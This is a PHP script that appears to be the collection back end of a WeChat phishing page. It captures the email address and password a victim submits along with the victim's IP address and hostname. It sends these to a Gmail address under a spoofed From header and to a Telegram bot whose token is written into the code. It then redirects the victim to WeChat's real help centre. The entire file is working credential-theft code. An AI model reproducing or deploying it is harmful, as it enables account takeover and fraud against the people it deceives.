<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ WeChat! LOGS ]+==================\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['fullname']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "=============+ [ WeChat! LOGS ] +=============\n";

$send= "benjaminlambrecht123@gmail.com
";

$subject = "WeChat | $ip";
$headers = "From:  WeChat<ahmednasir@cisco.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
$chat_id = '5327910631';
$data = array('chat_id' => $chat_id,'text' => $message);
$url = 'https://api.telegram.org/bot7105882607:AAHcrQ7HxQha_YxO85nTdDSZvc4ydnCqKXo/sendMessage';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, count($data));
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

header("Location: https://help.wechat.com/cgi-bin/micromsg-bin/oshelpcenter?opcode=2&lang=en&plat=ios&id=200424RvA7ZJ200424uyeQfY&Channel=helpcenter&t=help_center/w_topic_detail");

?>
